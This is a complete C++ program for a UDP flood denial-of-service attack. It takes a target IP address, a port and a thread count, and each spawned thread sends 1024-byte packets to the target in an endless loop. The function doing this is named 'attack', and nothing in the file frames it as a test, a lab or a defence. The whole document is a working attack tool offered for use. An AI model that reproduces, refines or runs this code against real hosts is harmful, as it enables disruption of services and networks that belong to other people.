#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>

using namespace std;

void attack(const char* target, int port)
{
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(target);
    serverAddr.sin_port = htons(port);

    char buffer[1024];

    while(true)
    {
        sendto(sock, buffer, sizeof(buffer), 0, (sockaddr*)&serverAddr, sizeof(serverAddr));
    }

    close(sock);
}

int main(int argc, char* argv[])
{
    if(argc < 4)
    {
        cout << "Usage: " << argv[0] << " <target IP> <port> <threads>" << endl;
        return 1;
    }

    const char* target = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);

    thread* threadsArr = new thread[threads];

    for(int i = 0; i < threads; i++)
    {
        threadsArr[i] = thread(attack, target, port);
    }

    for(int i = 0; i < threads; i++)
    {
        threadsArr[i].join();
    }

    delete[] threadsArr;

    return 0;
}
